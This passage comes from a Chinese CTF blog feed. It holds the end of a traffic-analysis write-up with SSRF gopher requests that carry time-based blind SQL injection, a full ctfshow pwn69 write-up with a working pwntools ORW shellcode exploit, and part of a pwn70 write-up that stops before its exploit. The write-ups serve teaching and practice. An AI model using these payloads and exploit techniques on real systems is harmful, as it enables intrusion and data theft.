<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?url=gopher://127.0.0.1:80/_POST</span> /admin.php <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> localhost:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>80</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">id</span>=<span class="number">1</span>) and if((ascii(substr((select flag from flag),<span class="number">14</span>,<span class="number">1</span>))=&#x27;<span class="number">125</span>&#x27;),sleep(<span class="number">3</span>),<span class="number">0</span>) --  HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: <span class="number">39.105.136.196:30025</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">User</span>-Agent: python-requests/<span class="number">2</span>.<span class="number">24</span>.<span class="number">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>: */*</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Connection</span>: keep-alive</span></span><br></pre></td></tr></table></figure>

<p><code>&#125;</code>对应的ascll码为<code>125</code>，可能是flag的最后一位</p>
<p>我们看一看时间最短的那个包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?url=gopher://127.0.0.1:80/_POST</span> /admin.php <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> localhost:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>79</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">id</span>=<span class="number">1</span>) and if((ascii(substr((select flag from flag),<span class="number">1</span>,<span class="number">1</span>))=&#x27;<span class="number">102</span>&#x27;),sleep(<span class="number">3</span>),<span class="number">0</span>) --  HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: <span class="number">39.105.136.196:30025</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">User</span>-Agent: python-requests/<span class="number">2</span>.<span class="number">24</span>.<span class="number">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>: */*</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Connection</span>: keep-alive</span></span><br></pre></td></tr></table></figure>

<p><code>f</code>对应的ascll码<code>102</code></p>
<p>基本可以确定这个就是flag了</p>
<p>我们一个一个包看，最后就可以得到Flag,你也可以使用exp求解flag但是我实力不足，等我会了我会更新的</p>
]]></content>
      <tags>
        <tag>MISC</tag>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow pwn入门 pwn69</title>
    <url>/2025/11/21/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn69/</url>
    <content><![CDATA[<h2 id="pwn69"><a href="#pwn69" class="headerlink" title="pwn69"></a>pwn69</h2><p><a href="https://ctf.show/challenges#pwn69-4079">ctf.show pwn69</a></p>
<span id="more"></span>

<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li><a href="#jump1">题目</a></li>
<li><a href="#jump2">预计时间</a></li>
<li><a href="#jump3">题目分析及截图</a></li>
</ul>
<hr>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id="jump1">题目</a></h4><img src="/2025/11/21/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn69/1.png" class="" title="This is an image">

<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id="jump2">预计时间</a></h4><p>6h</p>
<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a id="jump3">题目分析及截图</a></h4><p><strong><code>ORW</code>是什么</strong></p>
<blockquote>
<p>​    当题目不允许直接执行&#x2F;bin&#x2F;sh(例如进制<code>execve</code>，过滤ROP，沙箱只允许有限syscall)，但是你仍然需要读取服务器上的某个Flag文件，就必须靠syscall来完成</p>
</blockquote>
<ol>
<li><p><strong>open(“flag”, O_RDONLY)</strong></p>
<p>打开flag文件，获得文件描述符</p>
</li>
<li><p><strong>read(fd,buf,size)</strong></p>
<p>读取flag内容到缓冲区</p>
</li>
<li><p><strong>wirte(1,buf,size)</strong></p>
<p>输出到标准输出</p>
</li>
</ol>
<p><strong>什么是沙箱？</strong></p>
<blockquote>
<p>​    沙箱指一种”限制程序能力的隔离环境”，让程序即使被攻击，也只能做非常有限的事情，不能危害系统。简单说，就是限制程序，只能做白名单里的操作</p>
</blockquote>
<p>​      在pwn中最常见的就是 <strong>seccomp 沙箱</strong>  全称（<strong>Secure Computing Mode</strong>），它是Linux内核提供的一种”系统调用级别”的安全机制，用来限制进程可以调用哪些syscall。</p>
<p>​     我们可以使用工具 <strong>seccom-tools</strong> 来分析 <strong>seccomp沙箱</strong>，列出程序允许的系统调用</p>
<p>安装的教程很多，我这里不再说了</p>
<p>介绍一下使用方法:  <code>seccomp-tools dump ./pwn</code></p>
<hr>
<p>我们反编译看一下程序的代码</p>
<ol>
<li><strong>main函数</strong></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000u</span>LL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_400949();</span><br><span class="line">  sub_400906();</span><br><span class="line">  sub_400A16();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><strong>sub_400949()函数</strong></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_400949</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">60LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>sub_400A16()函数</strong></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400A16</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now you can use ORW to do&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No you don&#x27;t understand I say!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><strong>sub_4009EE()函数</strong></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_4009EE</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __asm &#123; jmp     rsp &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<ol>
<li>在函数<code>main</code>中</li>
</ol>
<p>​     <code>mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);</code>这个函数的作用就是从 0x123000 这个地址开始的 0x1000个字节，给它 <strong>写和执行</strong>的权限。</p>
<p>​      mmap这里的<strong>4代表执行，2代表写，1代表读</strong>。这里4就是可执行，2就是可写（4+2&#x3D;6）</p>
<ol start="2">
<li>在函数<code>sub_400A16()</code>中</li>
</ol>
<p>​       <code>char buf[32]</code>定义了一个0x20字节的缓冲区buf</p>
<p>​       <code>read(0, buf, 0x38uLL)</code> 这里是很有可能发生栈溢出的，因为我们定义的buf的缓冲区空间只有0x20字节，但是这里</p>
<p>我们可以读入0x38字节字符，是很危险的。<strong>但是我们就是通过这里的栈溢出去进行攻击的</strong></p>
<ol start="3">
<li><p>在函数<code>sub_400949()</code>中</p>
<p>  我们可以看到 <strong>seccomp</strong> 这可以说是沙箱的标志</p>
<p>  我们使用<strong>seccomp-tools</strong>工具来查看我们执行的系统调用有哪些。</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn69$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  <span class="keyword">if</span> (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到程序可以调用 open,read,write函数</p>
<p><strong>所以我们可以利用栈溢出进行ORW来攻击</strong></p>
<blockquote>
<p>exp如下</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28131</span>)</span><br><span class="line"></span><br><span class="line">addr_mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x400A01</span></span><br><span class="line"><span class="comment">#orw</span></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(orw_shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">100</span>))</span><br><span class="line">payload += asm(<span class="string">&quot;mov rax,0x123000;jmp rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;do&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>我感觉这个payload挺难理解的。我讲一下我疑惑的点</p>
<ol>
<li><p><strong>Q</strong>：在<code>payload = asm(shellcraft.read(0,mmap,100))</code>它的意思是什么，我们往mmap中读入的是什么？</p>
<p><strong>A</strong>：这句的意思是：从标准输入中读取256字节数据到mmap地址，而我们往mmap读入的是：第二次发送的 <strong>ORW shellcode</strong>  </p>
</li>
<li><p><strong>Q</strong>：<code>payload = asm(shellcraft.read(0,mmap,100)) payload += asm(&quot;mov rax,0x123000;jmp rax&quot;)</code>实现了什么功能?</p>
<p><strong>A</strong>：<strong>一句话总结 从标准输入(文件描述符0)读取0x100字节数据，<br>写入到内存地址0x123000(mmap)</strong></p>
</li>
<li><p><strong>Q</strong>：<code>payload = payload.ljust(0x28, b&#39;a&#39;)</code>这里的<code>=</code>换成<code>+=</code>有什么影响？为什么我前面已经填充了很多字节的shellcode了但是还是需要填充缓冲区0x28字节，他不会造成溢出吗？而且返回地址这些偏移也会不准确？</p>
<p><strong>A</strong>：这两个写法的关键区别在于<code>ljust</code>的对象不同，导致最终<code>payload</code>的布局完全不一样。</p>
<ul>
<li><p>首先 <strong>第一种</strong> 写法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">100</span>))</span><br><span class="line">payload += asm(<span class="string">&quot;mov rax,0x123000;jmp rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这种写法是正确的，它是对整个payload进行ljust到0x28，并不是追加0x28字节的a,而是加以来（连带payload）一共是0x28字节，即确保我覆盖到栈上返回地址之前的位置</p>
</li>
<li><p><strong>第二种</strong>写法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">100</span>))</span><br><span class="line">payload += asm(<span class="string">&quot;mov rax,0x123000;jmp rax&quot;</span>)</span><br><span class="line">payload += payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这种写法是将 <strong>0x28字节a</strong> 再次追加到原payload后面。</p>
<p>这会导致：</p>
<ol>
<li><p>长度完全错了</p>
</li>
<li><p>栈偏移完全不对</p>
</li>
<li><p>覆盖不到正确的RIP</p>
</li>
<li><p>触发不了ROP</p>
</li>
</ol>
<p>这不是我们想要的结果，是逻辑错误</p>
<p><strong>这个问题困扰了我好长时间，如果你也不太理解，建议可以问一下gpt，我是问了他才知道的，ds感觉说的不太准确</strong></p>
</li>
</ul>
</li>
<li><p><strong>Q</strong>：<code>payload += p64(jmp_rsp) + asm(&quot;sub rsp,0x30;jmp rsp&quot;)</code>实现了什么功能？这里为什么是0x30?</p>
<p><strong>A</strong>：首先这个<code>jmp_rsp</code>是我们的返回地址。我们为什么要返回栈顶，其实不难理解。<br>我们在buf里输入我们的shellcode，返回栈顶就是去执行它嘛，然后跳转到mmap执行我们的ORW。<br>但是为什么要<code>sub rsp, 0x30</code>?这个30是哪里来的？</p>
<p> <strong>当我们执行到jmp rsp时，rsp刚好指向save rbp后面的8字节</strong></p>
<p>当ret跳到jmp rsp时：RSP指向的是save RIP后面的”下一段栈空间”，也就是payload中 0x28+8&#x3D;0x30</p>
</li>
<li><p><strong>Q</strong>：我们明明先发的shellcode就是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">100</span>)) </span><br><span class="line">payload += asm(<span class="string">&quot;mov rax,0x123000;jmp rax&quot;</span>) </span><br></pre></td></tr></table></figure>

<p>那么最后为什么我们还需要将rsp指向这里呢？我们不是已经执行过了吗？</p>
<p><strong>A</strong>：因为它并不是自动执行的，它只是放到了栈上还没有执行。我们必须使用 **ROP gadget（jmp rsp）**才能让CPU去自动执行。</p>
<p>如果没有 jmp rsp：</p>
<ul>
<li>程序不会跳到你写入栈上的shellcode</li>
<li>程序只会 ret 回原本的函数-&gt;导致程序崩溃</li>
<li>我的shellcode不会执行</li>
</ul>
<p><strong>简单两句话解释</strong> ：</p>
<ul>
<li><p><strong>stage1 shellcode（read + jmp mmap）只是你写在栈里的内容，不会自动运行。</strong></p>
</li>
<li><p><strong>ret → jmp_rsp → jmp rsp 才能把执行流跳到栈上的 shellcode。</strong></p>
</li>
</ul>
</li>
<li><p><strong>Q</strong>：在 <strong>ORW_shellcode</strong> 中 <code>shellcraft.read(3,mmap,100)</code>，这里面的3是什么？我们往mmap中读入的是什么？</p>
<p><strong>A</strong>：</p>
<ul>
<li><p>这个<code>3</code>是文件描述符fd，为什么是3?</p>
<p>fd &#x3D; 0（stdin）</p>
<p>fd &#x3D; 1（stdout）</p>
<p>fd &#x3D; 2（stderr）</p>
<p>所以第一个可用的文件描述符fd通常是3</p>
</li>
<li><p>那么我们往mmap中读入的是什么？</p>
<p>因为第一步是open &#x2F;ctfshow——flag，所以这里我们是读入文件最多100字节</p>
</li>
</ul>
</li>
<li><p><strong>Q</strong>： <code>write(1,mmap,100)</code> 实现什么功能？</p>
<p><strong>A</strong>：写到 stdout ，让我看见flag</p>
</li>
</ol>
<p>​	其实到这里已经很清楚了，用我的大白话来说，本道题的思路就是在buf缓冲区中注入shellcode，这个shellcode的作用就是读取ORW_shellcode到mmap（因为buf的缓冲区太小了不足以放下ORW_shellcode），接着跳转到这里。然后我们填满栈偏移直至0x28字节，使用rsp执行我们的shellcode跳转到mmap，执行ORW shellcode 获得flag</p>
<p>​	这道题我认为比较有难度，但是虽然这道题很难，但你已经走得很远了，坚持一下，肯定能攻克它！</p>
<p>​	希望可以帮到你，加油！</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow pwn入门 pwn70</title>
    <url>/2025/11/22/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn70/</url>
    <content><![CDATA[<h2 id="pwn70"><a href="#pwn70" class="headerlink" title="pwn70"></a>pwn70</h2><p><a href="https://ctf.show/challenges#pwn70-4080">ctf.show pwn70</a></p>
<span id="more"></span>

<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li><a href="#jump1">题目</a></li>
<li><a href="#jump2">预计时间</a></li>
<li><a href="#jump3">题目分析及截图</a></li>
</ul>
<hr>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id="jump1">题目</a></h4><img src="/2025/11/22/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn70/1.png" class="" title="This is an image">

<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id="jump2">预计时间</a></h4><p>2h</p>
<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a id="#jump3">题目分析及截图</a></h4><p>我们首先checksec看看一下程序的保护机制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn70$ checksec ./pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/yyh/pwn70/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到程序只开启了canary</p>
<p>我们打开Ida看一下程序的反编译出来的代码</p>
<p><strong>main函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400A68 main            proc near               ; DATA XREF: _start+1D↑o</span><br><span class="line">.text:0000000000400A68</span><br><span class="line">.text:0000000000400A68 var_80          = qword ptr -80h</span><br><span class="line">.text:0000000000400A68 var_74          = dword ptr -74h</span><br><span class="line">.text:0000000000400A68 s               = byte ptr -70h</span><br><span class="line">.text:0000000000400A68 var_8           = qword ptr -8</span><br><span class="line">.text:0000000000400A68</span><br><span class="line">.text:0000000000400A68 ; __unwind &#123;</span><br><span class="line">.text:0000000000400A68                 push    rbp</span><br><span class="line">.text:0000000000400A69                 mov     rbp, rsp</span><br><span class="line">.text:0000000000400A6C                 add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">.text:0000000000400A70                 mov     [rbp+var_74], edi</span><br><span class="line">.text:0000000000400A73                 mov     [rbp+var_80], rsi</span><br><span class="line">.text:0000000000400A77                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000400A80                 mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000400A84                 xor     eax, eax</span><br><span class="line">.text:0000000000400A86                 mov     eax, 0</span><br><span class="line">.text:0000000000400A8B                 call    init</span><br><span class="line">.text:0000000000400A90                 mov     eax, 0</span><br><span class="line">.text:0000000000400A95                 call    set_secommp</span><br><span class="line">.text:0000000000400A9A                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400A9E                 mov     esi, 68h ; &#x27;h&#x27;  ; n</span><br><span class="line">.text:0000000000400AA3                 mov     rdi, rax        ; s</span><br><span class="line">.text:0000000000400AA6                 call    _bzero</span><br><span class="line">.text:0000000000400AAB                 mov     eax, 0</span><br><span class="line">.text:0000000000400AB0                 call    logo</span><br><span class="line">.text:0000000000400AB5                 lea     rdi, aWelcomeTellMeY ; &quot;Welcome,tell me your name:&quot;</span><br><span class="line">.text:0000000000400ABC                 call    _puts</span><br><span class="line">.text:0000000000400AC1                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AC5                 mov     edx, 64h ; &#x27;d&#x27;  ; nbytes</span><br><span class="line">.text:0000000000400ACA                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000400ACD                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000400AD2                 mov     eax, 0</span><br><span class="line">.text:0000000000400AD7                 call    _read</span><br><span class="line">.text:0000000000400ADC                 sub     eax, 1</span><br><span class="line">.text:0000000000400ADF                 cdqe</span><br><span class="line">.text:0000000000400AE1                 mov     [rbp+rax+s], 0</span><br><span class="line">.text:0000000000400AE6                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AEA                 mov     rdi, rax</span><br><span class="line">.text:0000000000400AED                 call    is_printable</span><br><span class="line">.text:0000000000400AF2                 test    eax, eax</span><br><span class="line">.text:0000000000400AF4                 jz      short loc_400AFE</span><br><span class="line">.text:0000000000400AF6                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AFA                 call    rax</span><br><span class="line">.text:0000000000400AFC                 jmp     short loc_400B0A</span><br></pre></td></tr></table></figure>

<p>我解释一下这个汇编代码</p>
<ol>
<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400A68                 push    rbp</span><br><span class="line">.text:0000000000400A69                 mov     rbp, rsp</span><br><span class="line">.text:0000000000400A6C                 add     rsp, 0FFFFFFFFFFFFFF80h</span><br></pre></td></tr></table></figure>

<p>分配一个70h的栈帧</p>
</li>
<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov [rbp+var_74], edi   ; argc</span><br><span class="line">mov [rbp+var_80], rsi   ; argv</span><br></pre></td></tr></table></figure>

<p>保存参数</p>
</li>
<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax, fs:28h</span><br><span class="line">mov [rbp+var_8], rax</span><br></pre></td></tr></table></figure>

<p>保存canary</p>
</li>
<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call init</span><br><span class="line">call set_secommp</span><br></pre></td></tr></table></figure>

<p>调用 init 和 seccomp函数。</p>
<p>seccomp是沙箱的标志，我们一会要使用seccomp-tools工具来看哪些系统调用可执行 </p>
</li>
<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea rax, [rbp+s]</span><br><span class="line">mov esi, 0x68        ; 104 字节</span><br><span class="line">mov rdi, rax</span><br><span class="line">call _bzero</span><br></pre></td></tr></table></figure>

<p>清零0x68字节</p>
</li>
<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call logo</span><br><span class="line">puts(&quot;Welcome,tell me your name:&quot;)</span><br></pre></td></tr></table></figure>

<p>打印logo，输出欢迎语</p>
</li>
<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea rax, [rbp+s]</span><br><span class="line">mov edx, 0x64     ; nbytes = 100</span><br><span class="line">mov rsi, rax      ; buf</span><br><span class="line">mov edi, 0        ; fd = stdin</span><br><span class="line">call read</span><br></pre></td></tr></table></figure>

<p>调用read函数，从stdin中最多读取0x64字节，read的返回值在eax中</p>
</li>
<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub eax, 1</span><br><span class="line">cdqe</span><br><span class="line">mov [rbp+rax+s], 0</span><br></pre></td></tr></table></figure>

<p>将最后一个字节改成<code>\x00</code>，即c字符串结尾</p>
</li>
<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea rax, [rbp+s]</span><br><span class="line">mov rdi, rax</span><br><span class="line">call is_printable</span><br><span class="line">test eax, eax</span><br><span class="line">jz short loc_400AFE</span><br></pre></td></tr></table></figure>

<p>检查是否全是printable字符</p>
</li>
</ol>
<p><strong>is_printable 函数</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">is_printable</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] &lt;= <span class="number">31</span> || a1[i] == <span class="number">127</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先获取字符串长度，循环遍历每一个字符</p>
<p>由于在汇编中看见了沙箱函数，所以这时，我们需要使用<code>seccomp-tools dump ./pwn</code>命令去看一下程序的可执行系统调用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn70$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x05 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0007</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x02 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>

<p><strong>除了execve</strong>都可以进行系统调用，那我们及就可以使用<code>ORW</code>或者直接<code>cat</code></p>
<p>在之前，我们也写过一个这样的题目，都是对shellcode中的每一位字符进行限制，但是在当时我们是使用<code>/x00</code>来绕过的，但是，<code>/x00</code>的含义在不同位置并不同</p>
<ul>
<li>在<code>is_printable函数</code>中，我们输入的相当于是c语言中&#x2F;x00的意思，也就是字符串结束符的意思</li>
<li>在发送payload时就是汇编语言中的意思，但是<code>/x00</code>是不能单独出现的，需要构成一条完整的汇编命令，在这里我们可以使用程序中有的指令<code>/x00/xc0</code>，当然你也可以直接自己构造</li>
</ul>
<p>其实到这里很简单了，我们直接写入shellcode就好了（需要加<code>/x00</code>进行绕过），因为这道题不涉及覆盖返回地址，我们不需要去管金丝雀值</p>
<blockquote>
<p>exp如下（cat写法）</p>
</blockquote>
